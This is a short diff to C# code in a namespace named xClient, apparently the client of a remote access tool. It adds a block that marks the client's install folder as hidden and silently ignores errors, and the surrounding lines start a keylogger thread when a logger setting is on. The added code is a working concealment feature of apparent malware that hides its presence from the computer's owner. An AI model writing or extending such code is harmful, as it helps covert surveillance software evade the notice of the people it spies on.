@@ -116,7 +116,18 @@ namespace xClient
                     {
                     }
                 }
+                if (Settings.INSTALL && Settings.HIDEINSTALLSUBFOLDER && !string.IsNullOrEmpty(Settings.SUBFOLDER))
+                {
+                    try
+                    {
+                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
+                        di.Attributes |= FileAttributes.Hidden;
 
+                    }
+                    catch (Exception)
+                    {
+                    }
+                }
                 if (Settings.ENABLELOGGER)
                 {
                     new Thread(() =>
